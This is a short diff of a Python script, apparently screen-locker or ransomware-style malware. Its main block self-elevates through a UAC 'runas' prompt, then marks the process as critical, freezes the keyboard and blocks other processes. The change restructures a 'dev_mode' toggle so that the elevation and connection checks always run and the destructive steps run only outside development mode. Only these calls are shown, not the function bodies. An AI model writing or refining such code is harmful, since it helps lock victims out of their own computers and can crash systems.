@@ -561,14 +561,14 @@ def disable_all():
 
 dev_mode = True
 if __name__ == "__main__":
-    if not dev_mode:
-        if not check_connection():
+    if not check_connection():
             sys.exit(2)
-        if not is_admin():
+    if not is_admin():
             ctypes.windll.shell32.ShellExecuteW(
                 None, "runas", sys.executable, " ".join(sys.argv), None, 1
             )
             sys.exit(0)
+    if not dev_mode:
         set_process_critical()
         freeze_keyboard()
         block_processes()
